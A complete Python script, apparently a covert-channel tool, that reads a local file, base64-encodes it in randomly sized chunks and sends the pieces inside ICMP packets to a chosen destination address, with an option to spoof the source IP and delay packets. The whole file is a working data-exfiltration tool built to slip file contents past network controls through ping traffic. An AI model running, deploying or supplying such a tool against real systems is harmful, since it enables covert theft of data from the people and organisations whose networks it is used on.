#!/usr/bin/python
from scapy.layers.inet import IP, ICMP
from scapy.sendrecv import send
from typing import List, Generator, Optional
import base64
import os.path
import argparse
import io
import asyncio
import random


def read_and_fragment_file(filename: str) -> Generator[bytes, None, None]:
    if os.path.isfile(filename):
        with open(filename, "rb") as f:
            while True:
                chunk = f.read(random.randint(io.DEFAULT_BUFFER_SIZE // 16, io.DEFAULT_BUFFER_SIZE // 12))
                if not chunk:
                    break
                yield chunk
    else:
        raise SystemExit


def get_base64_encoded_file_chunks(chunks) -> Generator[bytes, None, None]:
    for chunk in chunks:
        yield base64.b64encode(chunk)


def get_base64_encoded_file_identifier(filename: str, source: str) -> bytes:
    return base64.b64encode((":".join([source, filename]).encode("ascii")))


def get_base64_encoded_size_in_bytes(encoded: str) -> int:
    return int(len(encoded) * 3 / 4) - str(encoded).count('=')


def add_overhead_to_chunk(chunk: bytes, sequence_number: int, chunk_id: bytes) -> str:
    return str(chunk, "utf-8") + ':' + "%04d" % sequence_number + ':' + str(chunk_id, "utf-8")


def create_icmp_payload(chunks: Generator[bytes, None, None], chunks_id: bytes):
    for sequence_number, chunk in enumerate(chunks):
        yield add_overhead_to_chunk(chunk=chunk, sequence_number=sequence_number + 1, chunk_id=chunks_id)


def create_icmp_packet(data: str, source: str, destination: str) -> IP:
    return IP(src=source, dst=destination) / ICMP() / f"{data}"


def create_icmp_buffer(data, source: str, destination: str) -> list:
    for chunk in data:
        yield create_icmp_packet(data=chunk, source=source, destination=destination)


async def send_icmp_packets(buffer: List[IP], interval: int) -> None:
    for icmp_packet in buffer:
        send(icmp_packet)
        await asyncio.sleep(interval)


async def send_payload_via_icmp(payload, source: str, destination: str, interval: int) -> None:
    icmp_buffer = create_icmp_buffer(data=payload, source=source, destination=destination)
    await send_icmp_packets(buffer=icmp_buffer, interval=interval)


def show_packet_details(packet: IP) -> None:
    packet.show()


async def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-s", "--source", help="Source IPv4 address", default='127.0.0.1', type=str)
    parser.add_argument("-d", "--destination", help="Destination IPv4 address", type=str)
    parser.add_argument("-f", "--filename", help="File's name to send", type=str)
    parser.add_argument("-i", "--interval", help="Time interval between sending packets", default=0, type=int)
    args = parser.parse_args()

    file_chunks = read_and_fragment_file(filename=args.filename)
    encoded_file_chunks = get_base64_encoded_file_chunks(chunks=file_chunks)
    encoded_file_identifier = get_base64_encoded_file_identifier(filename=args.filename, source=args.source)
    icmp_payload = create_icmp_payload(chunks=encoded_file_chunks, chunks_id=encoded_file_identifier)
    await send_payload_via_icmp(payload=icmp_payload, source=args.source, destination=args.destination,
                                interval=args.interval)


if __name__ == '__main__':
    asyncio.run(main())
